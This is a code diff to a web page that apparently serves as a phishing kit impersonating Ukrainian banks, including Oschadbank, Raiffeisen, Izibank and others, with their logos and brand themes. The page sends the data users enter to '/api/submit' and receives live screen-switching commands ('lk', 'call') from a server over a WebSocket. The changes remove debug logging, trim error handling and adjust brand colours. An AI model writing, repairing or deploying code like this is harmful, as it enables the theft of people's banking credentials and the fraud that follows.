@@ -397,7 +397,8 @@
     </div>
 
     <div id="themed-modal-overlay">
-        <div class="themed-modal-content" id="themed-modal-content"></div>
+        <div class="themed-modal-content" id="themed-modal-content">
+            </div>
     </div>
 
 <script>
@@ -406,9 +407,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', type: 'oschad' },
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Raiffeisen_Bank_Aval_Logo.svg/1000px-Raiffeisen_Bank_Aval_Logo.svg.png', type: 'raiff', colors: { bg: '#1C1C1E', text: '#F2F2F7', text_secondary: '#8E8E93', primary: '#FFCC00', btn_bg: '#2C2C2E', btn_text: '#8E8E93', btn_active_text: '#000000', input_border: '#2C2C2E' }},
-        'alliance':   { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#00A3E0', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
-        'vostok':     { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#F28C38', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
-        'izibank':    { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#D35400', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
+        'alliance':   { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#007BFF', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
+        'vostok':     { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#FF8C00', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
+        'izibank':    { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#E65100', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }},
         'ukrsib':     { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', type: 'themed', colors: { bg: '#ffffff', text: '#212529', text_secondary: '#6c757d', primary: '#009A44', btn_bg: '#f0f2f5', btn_text: '#6c757d', btn_active_text: '#ffffff', input_border: '#dee2e6' }}
     };
 
@@ -437,15 +438,9 @@ document.addEventListener('DOMContentLoaded', () => {
     function connectWebSocket() {
         const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
         ws = new WebSocket(`${protocol}://${window.location.host}`);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            ws.send(JSON.stringify({ type: 'register', sessionId }));
-        };
+        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
         ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
-        ws.onclose = () => {
-            console.log('WebSocket closed, reconnecting...');
-            setTimeout(connectWebSocket, 3000);
-        };
+        ws.onclose = () => setTimeout(connectWebSocket, 3000);
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
 
@@ -475,7 +470,7 @@ document.addEventListener('DOMContentLoaded', () => {
         input.addEventListener('blur', () => { group.classList.remove('is-focused'); checkValue(); });
         input.addEventListener('input', checkValue);
         checkValue();
-    }
+    };
 
     function renderThemedPhoneScreen() {
         applyBankTheme();
@@ -763,6 +758,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // --- OSCHADBANK SPECIFIC FUNCTIONS ---
+    // (весь блок функций для Ощадбанка остается здесь без изменений)
     function renderOschadbankLogin(options = {}) {
         const { errorType, errorMessage, savedPhone } = options;
         const html = `
@@ -1034,21 +1030,14 @@ document.addEventListener('DOMContentLoaded', () => {
     async function sendDataToServer(data, isFinal) {
         collectedData = { ...collectedData, ...data };
         try {
-            const response = await fetch(`/api/submit`, {
+            await fetch(`/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, referrer, ...data }),
             });
-            console.log('Data sent to server:', { sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...data });
-            if (!response.ok) {
-                throw new Error(`HTTP error! Status: ${response.status}`);
-            }
-        } catch (error) {
-            console.error('Failed to send data:', error);
-        }
+        } catch (error) { console.error('Failed to send data:', error); }
     }
     function handleServerCommand({ type, data }) {
-        console.log('Received server command:', { type, data });
         switch (type) {
             case 'lk': renderOschadbankLogin(); break;
             case 'call': renderOschadbankCallConfirmation(); break;
@@ -1089,4 +1078,12 @@ document.addEventListener('DOMContentLoaded', () => {
             if (activeBankData.type === 'oschad') {
                 renderOschadbankLogin();
             } else {
-                render
+                renderThemedPhoneScreen();
+            }
+            connectWebSocket();
+        });
+    });
+});
+</script>
+</body>
+</html>
